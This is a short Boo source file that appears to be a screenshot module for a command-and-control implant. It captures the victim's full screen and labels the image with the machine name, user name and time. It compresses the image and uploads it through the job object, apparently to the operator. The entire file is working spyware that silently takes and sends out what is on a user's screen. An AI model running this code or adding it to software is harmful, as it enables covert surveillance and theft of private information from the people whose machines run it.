#Reference: https://stackoverflow.com/a/1163770

import System.Windows.Forms
import System.Drawing
import System.IO
import System.IO.Compression
import System

public static def Start(job as duck):
    bounds = Screen.GetBounds(Point.Empty)
    bitmap = Bitmap(bounds.Width, bounds.Height)
    graph = Graphics.FromImage(bitmap)
    graph.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size)

    timestamp = String.Format("{0:yyyyMMdd_hhmmss}", DateTime.Now)
    filename = "$(Environment.MachineName)_$(Environment.UserName)_$(timestamp)"

    using memStream = MemoryStream():
        using outStream = MemoryStream():
            using gStream = GZipStream(outStream, CompressionMode.Compress):
                bitmap.Save(memStream, Imaging.ImageFormat.Jpeg)
                bytes = memStream.ToArray()
                gStream.Write(bytes, 0, bytes.Length)
            outBytes = outStream.ToArray()

    job.UploadAsBytes(outBytes, filename)